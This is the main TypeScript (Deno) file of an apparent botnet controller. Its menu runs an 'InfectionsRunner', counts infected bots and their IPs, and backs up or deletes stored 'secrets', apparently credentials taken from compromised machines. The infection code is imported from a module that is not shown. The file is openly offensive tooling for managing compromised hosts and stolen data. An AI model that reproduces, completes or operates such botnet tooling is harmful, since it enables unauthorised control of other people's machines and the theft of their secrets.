import { BotNetDataBase } from "./database/index.ts";
import { Prompt } from "./prompt/index.ts";
import { InfectionsRunner } from './runner/infections/index.ts';

Prompt.showTitle();

const mode = Prompt.showOptions();
const kv = new BotNetDataBase();
kv.setup();

switch (mode) {
    case "infections":
        new InfectionsRunner().run();
        break;
    // deno-lint-ignore no-case-declarations
    case "backup":
        console.log(`\x1b[32m[+]\x1b[0m Current have botnets: ${await kv.quantity()}`);
        console.log(`\x1b[32m[+]\x1b[0m Current have botnets IP: ${await kv.quantityIP()}`);
        const list = await kv.kv?.list({
            prefix: ["secrets"],
        });

        if (!list) {
            console.log("\x1b[31m[!] No botnets found\x1b[0m");
            break;
        }

        const json = {} as { [key: string]: unknown };

        for await (const item of list) {
            const key = item.key[1] as string;
            json[key] = item.value;
        }

        const saveFilePath = Prompt.promptSaveFile();

        Deno.writeTextFile(saveFilePath, JSON.stringify(json, null, 2));

        break;
    // deno-lint-ignore no-case-declarations
    case "delete":
        console.log(`\x1b[32m[+]\x1b[0m Current have botnets: ${await kv.quantity()}`);
        console.log(`\x1b[32m[+]\x1b[0m Current have botnets IP: ${await kv.quantityIP()}`);
        const answer = prompt("\x1b[32m[?] \x1b[0mAre you sure? (y/n)");

        if (answer !== "y") {
            console.log("\x1b[31m[!] Canceled\x1b[0m\n");
            break;
        }

        const list2 = await kv.kv?.list({
            prefix: ["secrets"],
        });

        if (!list2) {
            console.log("\x1b[31m[!] No botnets found\x1b[0m");
            break;
        }

        for await (const item of list2) {
            const key = item.key;
            await kv.kv?.delete(key);
        }

        console.log(`\x1b[32m[+]\x1b[0m Deleted all botnets`);

        break
    case "view":
        console.log(`\x1b[32m[+]\x1b[0m Current have botnets: ${await kv.quantity()}`);
        console.log(`\x1b[32m[+]\x1b[0m Current have botnets IP: ${await kv.quantityIP()}`);
        break;
    case "operation":
        console.log("\x1b[32m[~] WIP\x1b[0m\n");
        break;
    default:
        break;
}
